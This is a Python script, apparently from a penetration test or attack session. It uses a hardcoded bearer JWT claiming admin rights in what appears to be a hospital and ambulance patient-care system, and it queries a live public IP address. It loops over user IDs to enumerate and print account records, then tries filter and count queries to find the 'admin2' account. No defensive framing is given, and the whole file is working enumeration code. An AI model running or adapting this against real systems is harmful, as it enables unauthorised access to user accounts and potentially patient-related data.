#!/usr/bin/env python3
"""
Find admin2 user - try wider range + filter /users for admin2 name
"""
import json
import urllib.request
import urllib.error

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiYWRtaW4yIiwicm9sZSI6IkFETUlOIiwidXNlciI6eyJuYW1lIjoiYWRtaW4yIiwiYWNjb3VudCI6ImFkbWluMiIsImV4dEFjY291bnQiOm51bGwsImlzTG9jYWwiOnRydWUsImN1c3RvbURhdGEiOm51bGwsInJvbGUiOiJBRE1JTiJ9LCJwZXJtaXNzaW9ucyI6WyJFUENSX1NFUlZJQ0UiLCJFUENSX1BBR0VfQlVMTEVUSU4iLCJFUENSX1BBR0VfUkVTT1VSQ0VNQU5BR0VNRU5UIiwiRVBDUl9QQUdFX01PTklUT1IiLCJFUENSX1BBR0VfQ0FTRUxJU1QiLCJFUENSX1BBR0VfQ0FTRURFVEFJTCIsIkVQQ1JfUEFHRV9DQVNFREVUQUlMUFJJTlQiLCJFUENSX1BBR0VfTUNJTElTVCIsIkVQQ1JfUEFHRV9NQ0lERVRBSUwiLCJFUENSX1BBR0VfQlJBTkNIIiwiRVBDUl9QQUdFX0JSQU5DSEdST1VQIiwiRVBDUl9QQUdFX0hPU1BJVEFMIiwiRVBDUl9QQUdFX0RFVklDRSIsIkVQQ1JfUEFHRV9BTUJVTEFOQ0UiLCJFUENSX1BBR0VfRU1UIiwiRVBDUl9QQUdFX0VNVExFVkVMIiwiRVBDUl9QQUdFX0VNVFRSQUlOSU5HIiwiRVBDUl9QQUdFX0VNVFRSQUlOSU5HVFlQRSIsIkVQQ1JfUEFHRV9TVEFUIiwiRVBDUl9QQUdFX0lTU1VFVFJBQ0tJTkciLCJFUENSX1BBR0VfQ0FTRVNJTVVMQVRPUiIsIkVQQ1JfQ0FTRVJFQ09SRF9SRUFEIiwiRVBDUl9DQVNFUkVDT1JEX1VQREFURSIsIkVQQ1JfQ0FTRVJFQ09SRF9DUkVBVEUiLCJFUENSX0NBU0VSRUNPUkRfREVMRVRFIiwiSE9TUElUQUxfUEFHRV9IT1NQSVRBTCIsIkhPU1BJVEFMX1BBR0VfSE9TUElUQUxDQVBBQklMSVRZIiwiSE9TUElUQUxfUEFHRV9CQUNLVFJBQ0tJTkciLCJIT1NQSVRBTF9QQUdFX0hPU1BJVEFMQ0FQQUJJTElUWUxJU1QiLCJET0NUT1JfUEFHRV9ET0NUT1IiLCJET0NUT1JfUEFHRV9TQ0hFRFVMRSIsIkRPQ1RPUl9JTlNUUlVDVF9BTEwiLCJNT05JVE9SX0FMTCIsIkVQQ1JfT0ZGSUNJQUxDQVNFIiwiRVBDUl9DQVNFX1NDT1JFIiwiQVVUSF9ST0xFIiwiQVVUSF9VU0VSIiwiQVVUSF9QRVJNIiwiQVVUSF9VU0VSX0FMTCIsIkRPQ1RPUl9URVNUX1BVU0giLCJFUENSX1BBR0VfU1VQUExJRVNDT05GSUciLCJFUENSX1BBR0VfU1VQUExJRVNRVUVSWSIsIkVQQ1JfUEFHRV9TVVBQTElFU1NUT0NLSU4iLCJFUENSX1BBR0VfU1VQUExJRVNTVE9DS09VVCIsIkVQQ1JfUEFHRV9TVVBQTElFU1JFUVVFU1QiLCJFUENSX1BBR0VfU1VQUExJRVNJU1NVQU5DRSIsIkVQQ1JfUEFHRV9TVVBQTElFU0lOVkVOVE9SWSIsIkVQQ1JfUEFHRV9TVVBQTElFUyIsIkhPU1BJVEFMX1BBR0VfRElTUEFUQ0giLCJFUENSX0RPQ1RPUl9PUkRFUiIsIkVQQ1JfUEFHRV9TVVBQTElFU1NUQVRTIiwiSE9TUElUQUxfUEFHRV9DQVNFTElTVCIsIkhPU1BJVEFMX0hPU1BJVEFMX0RFTEVURSIsIkVQQ1JfQlJBTkNIIiwiRVBDUl9QQUdFX1NUQVRfTUFOQUdFUiIsIkhPU1BJVEFMX1BBR0VfU1RBVCIsIk1DSV9VUERBVEVfQ0FTRSIsIk1DSV9UUklBR0UiLCJNQ0lfVFJFQVRNRU5UIiwiTUNJX0RJU1BBVENIIiwiTUNJX0VNVCIsIk1DSV9BU1NJR05fUk9MRSIsIk1DSV9WSUVXX1BDUiIsIk1DSV9ERUxFR0FURSIsIkVQQ1JfUEFHRV9DSEFOR0VIT1MiLCJFUENSX1BBR0VfT0hDQUNBU0VMSVNUIiwiQVVUSF9SRVNFVF9QQVNTV09SRCIsIkFVVEhfUkVTRVRfTE9HSU4iLCJBVVRIX0RFTF9VU0VSIiwiQVVUSF8yRkEiLCJFUENSX1BBR0VfQkFDS1RSQUNLX0FETUlOIl0sImlhdCI6MTc4ODA4ODQyMywiZXhwIjoxNzg4MjYxMjIzfQ.-3sgbFVVVOAcKYnjQ_ndJKe3BW5aYzwOBwMtflpmNbQ"

# Try wider range
print("=== Trying id=37 specifically ===")
url = "http://35.234.50.28:3400/users/37"
req = urllib.request.Request(url, headers={"Authorization": f"Bearer {JWT}"})
try:
    with urllib.request.urlopen(req, timeout=8) as r:
        body = r.read().decode('utf-8', errors='replace')
        print(f"id=37 -> {r.status}, len={len(body)}")
        print(f"body={body[:1000]}")
except urllib.error.HTTPError as e:
    print(f"id=37 -> HTTP {e.code}, body={e.read().decode()[:500]}")
except Exception as e:
    print(f"id=37 err: {e}")

print("\n=== Trying wider range (60-200) ===")
hits = []
for uid in range(60, 200):
    url = f"http://35.234.50.28:3400/users/{uid}"
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {JWT}"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read().decode('utf-8', errors='replace')
            if r.status == 200 and body and body != "[]":
                data = json.loads(body)
                if isinstance(data, dict) and 'id' in data:
                    hits.append(data)
                    print(f"[+] /users/{uid}: id={data.get('id')} account={data.get('account')!r} name={data.get('name')!r}")
    except urllib.error.HTTPError as e:
        pass
    except Exception as e:
        pass

print(f"\nFound {len(hits)} additional users in range 60-199")

# Try filter
print("\n=== Trying filter[where][account]=admin2 ===")
url = "http://35.234.50.28:3400/users?filter[where][account]=admin2"
req = urllib.request.Request(url, headers={"Authorization": f"Bearer {JWT}"})
try:
    with urllib.request.urlopen(req, timeout=8) as r:
        body = r.read().decode('utf-8', errors='replace')
        print(f"filter -> {r.status}, body={body[:2000]}")
except urllib.error.HTTPError as e:
    print(f"filter err {e.code}: {e.read().decode()[:500]}")

# Try getting user count
print("\n=== /users/count ===")
url = "http://35.234.50.28:3400/users/count"
req = urllib.request.Request(url, headers={"Authorization": f"Bearer {JWT}"})
try:
    with urllib.request.urlopen(req, timeout=8) as r:
        body = r.read().decode('utf-8', errors='replace')
        print(f"count -> {r.status}, body={body}")
except urllib.error.HTTPError as e:
    print(f"count err {e.code}: {e.read().decode()[:500]}")